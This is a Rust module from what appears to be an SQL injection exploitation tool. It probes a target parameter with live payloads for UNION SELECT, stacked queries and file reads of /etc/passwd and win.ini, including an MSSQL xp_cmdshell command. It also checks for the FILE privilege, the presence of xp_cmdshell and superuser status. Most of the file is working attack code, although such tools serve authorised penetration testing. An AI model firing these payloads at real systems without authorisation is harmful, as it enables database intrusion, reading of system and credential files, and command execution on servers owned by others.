//! Database Capabilities Detection
//!
//! Safely detect what the SQL injection can do.

use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::sqli::proof::DatabaseCapabilities;
use crate::sqli::DatabaseType;
use reqwest::Method;
use url::Url;

/// Detect database capabilities
pub async fn detect(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
    db_type: DatabaseType,
) -> anyhow::Result<DatabaseCapabilities> {
    let mut caps = DatabaseCapabilities::default();

    // Test UNION SELECT
    caps.union_select = test_union_select(client, base_url, param).await?;

    // Test stacked queries
    caps.stacked_queries = test_stacked_queries(client, base_url, param, db_type).await?;

    // Test file read
    caps.file_read = test_file_read(client, base_url, param, db_type).await?;

    // Test file write (safe check - doesn't actually write)
    caps.file_write = test_file_write_capability(client, base_url, param, db_type).await?;

    // Test command execution capability
    caps.command_exec = test_command_exec_capability(client, base_url, param, db_type).await?;

    // Test DNS exfiltration
    caps.dns_exfil = test_dns_exfil_capability(db_type);

    // Test outbound HTTP
    caps.outbound_http = test_outbound_http_capability(db_type);

    Ok(caps)
}

/// Test if UNION SELECT works
async fn test_union_select(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
) -> anyhow::Result<bool> {
    // Try different column counts
    for cols in 1..=10 {
        let nulls = vec!["NULL"; cols].join(",");
        let payload = format!("' UNION SELECT {}-- ", nulls);

        let mut url = base_url.clone();
        url.query_pairs_mut().append_pair(param, &payload);

        let req = HttpRequest::new(Method::GET, url);
        let resp = client.execute(req).await?;

        // If we get a 200 and no obvious error, UNION might work
        if resp.status == 200 {
            let body = resp.body_text();
            if !body.contains("error") && !body.contains("Error") {
                return Ok(true);
            }
        }
    }

    Ok(false)
}

/// Test if stacked queries work
async fn test_stacked_queries(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
    db_type: DatabaseType,
) -> anyhow::Result<bool> {
    let payload = match db_type {
        DatabaseType::MySQL => "'; SELECT 1;-- ",
        DatabaseType::MSSQL => "'; SELECT 1;-- ",
        DatabaseType::PostgreSQL => "'; SELECT 1;-- ",
        _ => return Ok(false),
    };

    let mut url = base_url.clone();
    url.query_pairs_mut().append_pair(param, payload);

    let req = HttpRequest::new(Method::GET, url);
    let resp = client.execute(req).await?;

    // Basic check - if no error, might work
    Ok(resp.status == 200)
}

/// Test file read capability
async fn test_file_read(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
    db_type: DatabaseType,
) -> anyhow::Result<bool> {
    let payload = match db_type {
        DatabaseType::MySQL => "' UNION SELECT LOAD_FILE('/etc/passwd')-- ",
        DatabaseType::PostgreSQL => "' UNION SELECT pg_read_file('/etc/passwd')-- ",
        DatabaseType::MSSQL => "'; EXEC xp_cmdshell 'type C:\\Windows\\win.ini';-- ",
        _ => return Ok(false),
    };

    let mut url = base_url.clone();
    url.query_pairs_mut().append_pair(param, payload);

    let req = HttpRequest::new(Method::GET, url);
    let resp = client.execute(req).await?;
    let body = resp.body_text();

    // Check for file content indicators
    let indicators = ["root:", "bin/bash", "[fonts]", "[extensions]"];
    Ok(indicators.iter().any(|i| body.contains(i)))
}

/// Test file write capability (safe - checks privilege only)
async fn test_file_write_capability(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
    db_type: DatabaseType,
) -> anyhow::Result<bool> {
    // Check for FILE privilege without actually writing
    let payload = match db_type {
        DatabaseType::MySQL => {
            "' AND (SELECT file_priv FROM mysql.user WHERE user=user() LIMIT 1)='Y'-- "
        }
        _ => return Ok(false),
    };

    let baseline_req = HttpRequest::new(Method::GET, base_url.clone());
    let baseline_resp = client.execute(baseline_req).await?;

    let mut url = base_url.clone();
    url.query_pairs_mut().append_pair(param, payload);

    let req = HttpRequest::new(Method::GET, url);
    let resp = client.execute(req).await?;

    // If response is similar to baseline, condition might be true
    Ok(resp.status == 200
        && (resp.body_len as i64 - baseline_resp.body_len as i64).abs() < 100)
}

/// Test command execution capability (safe - checks existence only)
async fn test_command_exec_capability(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
    db_type: DatabaseType,
) -> anyhow::Result<bool> {
    match db_type {
        DatabaseType::MSSQL => {
            // Check if xp_cmdshell exists
            let payload = "' AND (SELECT COUNT(*) FROM sys.objects WHERE name='xp_cmdshell')>0-- ";

            let baseline_req = HttpRequest::new(Method::GET, base_url.clone());
            let baseline_resp = client.execute(baseline_req).await?;

            let mut url = base_url.clone();
            url.query_pairs_mut().append_pair(param, payload);

            let req = HttpRequest::new(Method::GET, url);
            let resp = client.execute(req).await?;

            Ok(resp.status == 200
                && (resp.body_len as i64 - baseline_resp.body_len as i64).abs() < 100)
        }
        DatabaseType::PostgreSQL => {
            // Check for COPY TO PROGRAM capability (requires superuser)
            let payload = "' AND (SELECT usesuper FROM pg_user WHERE usename=current_user)=true-- ";

            let baseline_req = HttpRequest::new(Method::GET, base_url.clone());
            let baseline_resp = client.execute(baseline_req).await?;

            let mut url = base_url.clone();
            url.query_pairs_mut().append_pair(param, payload);

            let req = HttpRequest::new(Method::GET, url);
            let resp = client.execute(req).await?;

            Ok(resp.status == 200
                && (resp.body_len as i64 - baseline_resp.body_len as i64).abs() < 100)
        }
        _ => Ok(false),
    }
}

/// Check if DNS exfiltration is theoretically possible
fn test_dns_exfil_capability(db_type: DatabaseType) -> bool {
    matches!(
        db_type,
        DatabaseType::MySQL | DatabaseType::MSSQL | DatabaseType::Oracle | DatabaseType::PostgreSQL
    )
}

/// Check if outbound HTTP is theoretically possible
fn test_outbound_http_capability(db_type: DatabaseType) -> bool {
    matches!(
        db_type,
        DatabaseType::Oracle | DatabaseType::PostgreSQL | DatabaseType::MSSQL
    )
}

/// Generate capability report
pub fn generate_report(caps: &DatabaseCapabilities, db_type: DatabaseType) -> String {
    let mut report = String::new();

    report.push_str(&format!(
        "Database Capabilities Assessment for {}\n",
        db_type
    ));
    report.push_str(&format!("Risk Level: {}\n\n", caps.risk_level()));

    report.push_str("Capabilities:\n");
    report.push_str(&format!(
        "  [{}] UNION SELECT\n",
        if caps.union_select { "✓" } else { "✗" }
    ));
    report.push_str(&format!(
        "  [{}] Stacked Queries\n",
        if caps.stacked_queries { "✓" } else { "✗" }
    ));
    report.push_str(&format!(
        "  [{}] File Read\n",
        if caps.file_read { "✓" } else { "✗" }
    ));
    report.push_str(&format!(
        "  [{}] File Write\n",
        if caps.file_write { "✓" } else { "✗" }
    ));
    report.push_str(&format!(
        "  [{}] Command Execution\n",
        if caps.command_exec { "✓" } else { "✗" }
    ));
    report.push_str(&format!(
        "  [{}] DNS Exfiltration\n",
        if caps.dns_exfil { "✓" } else { "✗" }
    ));
    report.push_str(&format!(
        "  [{}] Outbound HTTP\n",
        if caps.outbound_http { "✓" } else { "✗" }
    ));

    report.push_str("\nRisk Assessment:\n");
    report.push_str(&caps.assessment());

    report
}

